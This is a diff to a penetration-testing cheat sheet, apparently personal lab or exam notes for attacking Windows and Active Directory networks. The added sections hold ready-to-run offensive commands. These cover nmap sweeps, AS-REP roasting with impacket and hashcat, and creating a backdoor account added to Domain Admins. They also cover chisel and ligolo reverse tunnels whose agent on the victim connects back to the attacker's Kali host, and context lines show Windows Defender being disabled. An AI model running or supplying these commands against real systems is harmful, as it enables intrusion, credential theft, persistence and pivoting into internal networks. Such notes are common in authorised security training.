@@ -6,6 +6,9 @@ pwndoc save: `-oX nmaps.xml`
 Network sweep:
 ```
 sudo nmap -v -sn 10.0.0.0/24 -oG nmaps.txt
+With ligolo:
+nmap -v -sn 10.0.0.0/24 --unprivileged
+nmap -sS -Pn 10.0.0.0/24
 ```
 
 Individual:
@@ -29,7 +32,6 @@ Log into drive: smbclient //{ip}/{drive}
 
 AD: smbclient -L //ip/ -U {domain}/{user} --password=''
 ```
-
 
 metasploit:
 ```
@@ -89,6 +91,10 @@ cmd:
 net localgroup “Remote Desktop Users” {user} /add
 net user test password123! /add && net localgroup administrators test /add
 
+Domain:
+net user test password123! /add /domain
+net group "Domain Admins" test /add /domain
+
 ```
 
 **Roasting**
@@ -96,6 +102,8 @@ net user test password123! /add && net localgroup administrators test /add
 ```
 AS-REQ:
 impacket-GetNPUsers -dc-ip {dc ip} -request -outputfile hashes.asreproast {domain/user}
+
+impacket-GetNPUsers -request -dc-ip {dc ip} -usersfile users.txt {domain}/ -no-pass
 
 Hashcat:
 hashat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
@@ -268,3 +276,44 @@ Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection 
 
 **Enable-NetFirewallRule -DisplayGroup "Remote Desktop"**
 ```
+
+
+**Chisel**
+```
+Start a server on kali:
+chisel server --port 445 --reverse
+
+Windows:
+chisel.exe {kali_ip}:445 R:{target port}:127.0.0.1:{kali port}
+```
+
+**Ligolo**
+Proxy:
+```
+sudo ip tuntap add user kali mode tun ligolo
+
+sudo ip link set ligolo up
+
+./lin-proxy -selfcert -laddr 0.0.0.0:443
+```
+
+Transfer agent to target
+```
+.\lin-agent.exe -connect {kali_ip}:443 -ignore-cert 
+```
+
+On server:
+```
+session
+ifconfig
+```
+
+On kali:
+```
+sudo ip route add {internal subnet ip} dev ligolo
+
+**Ex: 10.10.209.0/24 make sure it’s 0/24 for all interfaces**
+```
+
+On server: `start`
+**Add a listener: listener_add --addr 0.0.0.0:1235 --to**
